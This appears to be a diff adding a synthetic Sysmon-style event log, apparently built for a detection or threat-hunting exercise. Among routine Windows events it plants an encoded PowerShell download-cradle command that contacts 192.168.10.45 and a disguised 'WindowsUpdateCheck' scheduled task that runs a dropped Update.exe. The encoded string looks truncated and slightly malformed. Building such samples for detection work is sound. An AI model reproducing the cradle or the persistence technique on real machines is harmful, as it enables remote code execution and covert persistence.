@@ -1,0 +1,143 @@
+[
+  {
+    "Timestamp": "2026-03-03T09:50:12",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\services.exe",
+    "CommandLine": "C:\\Windows\\system32\\services.exe"
+  },
+  {
+    "Timestamp": "2026-03-03T09:55:01",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k LocalService"
+  },
+  {
+    "Timestamp": "2026-03-03T10:00:01",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "normal_service.exe"
+  },
+  {
+    "Timestamp": "2026-03-03T10:02:15",
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIP": "142.250.190.46",
+    "DestPort": 443
+  },
+  {
+    "Timestamp": "2026-03-03T10:05:44",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\RuntimeBroker.exe",
+    "CommandLine": "RuntimeBroker.exe -Embedding"
+  },
+  {
+    "Timestamp": "2026-03-03T10:08:12",
+    "EventID": 3,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "DestinationIP": "23.21.145.10",
+    "DestPort": 443
+  },
+  {
+    "Timestamp": "2026-03-03T10:10:33",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\taskhostw.exe",
+    "CommandLine": "taskhostw.exe $(Arg0)"
+  },
+  {
+    "Timestamp": "2026-03-03T10:12:01",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\lsass.exe",
+    "CommandLine": "C:\\Windows\\system32\\lsass.exe"
+  },
+  {
+    "Timestamp": "2026-03-03T10:15:22",
+    "EventID": 3,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "-enc SQBFAVggACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAb3duAGw=",
+    "DestinationIP": "192.168.10.45",
+    "DestPort": 80
+  },
+  {
+    "Timestamp": "2026-03-03T10:15:45",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\conhost.exe",
+    "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0x4"
+  },
+  {
+    "Timestamp": "2026-03-03T10:16:05",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "/Create /SC MINUTE /MO 30 /TN \"WindowsUpdateCheck\" /TR \"C:\\Users\\Public\\Update.exe\"",
+    "User": "Musa-Workstation\\User1"
+  },
+  {
+    "Timestamp": "2026-03-03T10:18:22",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\SearchIndexer.exe",
+    "CommandLine": "/Embedding"
+  },
+  {
+    "Timestamp": "2026-03-03T10:20:10",
+    "EventID": 3,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "DestinationIP": "52.123.44.102",
+    "DestPort": 443
+  },
+  {
+    "Timestamp": "2026-03-03T10:22:45",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\dllhost.exe",
+    "CommandLine": "C:\\Windows\\system32\\dllhost.exe /Processid: {E10F6C3A-F1AE-4ADC-957D-2D65502E040D}"
+  },
+  {
+    "Timestamp": "2026-03-03T10:25:00",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WmiPrvSE.exe",
+    "CommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe"
+  },
+  {
+    "Timestamp": "2026-03-03T10:28:14",
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIP": "172.217.16.142",
+    "DestPort": 443
+  },
+  {
+    "Timestamp": "2026-03-03T10:30:55",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\smartscreen.exe",
+    "CommandLine": "C:\\Windows\\System32\\smartscreen.exe -Embedding"
+  },
+  {
+    "Timestamp": "2026-03-03T10:32:11",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\SppExtComObj.Exe",
+    "CommandLine": "-Embedding"
+  },
+  {
+    "Timestamp": "2026-03-03T10:35:00",
+    "EventID": 3,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "DestinationIP": "20.189.173.18",
+    "DestPort": 443
+  },
+  {
+    "Timestamp": "2026-03-03T10:40:22",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
+    "CommandLine": "-ServerName:BackgroundTaskHost.WebSupport"
+  },
+  {
+    "Timestamp": "2026-03-03T10:45:10",
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\SearchProtocolHost.exe",
+    "CommandLine": "Global\\UsermodeIndexerOutProcess_ParentProcess_654"
+  },
+  {
+    "Timestamp": "2026-03-03T10:50:00",
+    "EventID": 3,
+    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+    "DestinationIP": "13.107.21.200",
+    "DestPort": 443
+  }
+]
